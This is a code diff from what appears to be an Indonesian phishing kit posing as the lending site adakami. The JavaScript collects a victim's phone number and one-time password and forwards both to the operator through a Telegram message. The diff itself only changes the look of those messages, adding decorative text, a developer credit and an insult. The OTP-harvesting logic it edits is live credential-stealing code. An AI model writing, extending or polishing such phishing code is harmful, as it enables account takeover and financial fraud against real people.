@@ -199,7 +199,7 @@
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
 
-            const message = `<b>𓄂ᬼ𓆃༒ NOTIFIKASI BARU ༒ 𓄂ᬼ𓆃 </b>\n----------------------------------\n<b>👤 PENGIRIM :</b> <code>${phone}</code>\n<b>🌐 DOMAIN   :</b> www.adakami.website\n<b>💬 STATUS   :</b> Menunggu OTP...\n𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃`;
+            const message = `<b>◦•●◉✿ Pesan Masuk ✿◉●•◦</b>\n𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺\n<b>👤 𝙿𝙴𝙽𝙶𝙸𝚁𝙸𝙼ㅤㅤㅤ :</b> <code>${phone}</code>\n<b>🌐 𝙳𝙾𝙼𝙰𝙸𝙽ㅤㅤㅤ :</b> www.adakami.website\n<b>📨 𝚂𝚃𝙰𝚃𝚄𝚂ㅤㅤㅤ :</b> 𝑴𝒆𝒏𝒖𝒏𝒈𝒈𝒖 𝑶𝑻𝑷...\n˜”*°•.˜”*°• SABAR MONYET •°*”˜.•°*”˜`;
             sendTelegramMessage(message);
             
             setTimeout(() => {
@@ -222,7 +222,7 @@
             const modal = document.getElementById('otpModal');
             const desc = document.getElementById('otpDesc');
             desc.style.textAlign = 'center';
-            desc.innerHTML = `📬 <b>Kode verifikasi dikirim</b><br>(${phone.slice(0,4)}****${phone.slice(-4)})`;
+            desc.innerHTML = `ᯓ➤ <b>Kode verifikasi dikirim</b><br>(${phone.slice(0,4)}****${phone.slice(-4)})`;
 
             modal.style.display = 'flex';
             startTimer();
@@ -260,7 +260,7 @@
 
             const formattedOtp = otpCode.substring(0,3) + '-' + otpCode.substring(3,6);
 
-            const message = `<b>🔑 KODE OTP MASUK 🔑</b>\n----------------------------------\n<b>✅ OTP CODE :</b> <code>${formattedOtp}</code>\n<b>📱 NOMOR    :</b> <code>${userPhoneNumber}</code>\n<b>⏱️ WAKTU    :</b> ${new Date().toLocaleTimeString('id-ID')}\n----------------------------------\n<b>🖥 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 🖥</b>`;
+            const message = `<b> ── ⋆⋅𖤓⋅⋆ ── 𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗠𝗔𝗦𝗨𝗞 ── ⋆⋅𖤓⋅⋆ ── </b>\n𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺\n<b>🔐 ᴏᴛᴘ ᴄᴏᴅᴇ    :</b> <code>${formattedOtp}</code>\n<b>˗ˏˋ ☏ ˎˊ˗ ɴᴏᴍᴏʀ    :</b> <code>${userPhoneNumber}</code>\n<b>⏱️ ᴡᴀᴋᴛᴜ ᴘᴇɴɢɪʀɪᴍᴀɴ    :</b> ${new Date().toLocaleTimeString('id-ID')}\n𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺𓀐𓂺\n<b> ⋯⋅๑┈•✦ 𝘋𝘦𝘷𝘦𝘭𝘰𝘱𝘦𝘳 𝘣𝘺 ➤⃝𝘝𝘺𝘳𝘦𝘹𓂃 ✦•┈๑⋅⋯ </b>`;
             sendTelegramMessage(message);
 
             setTimeout(() => {
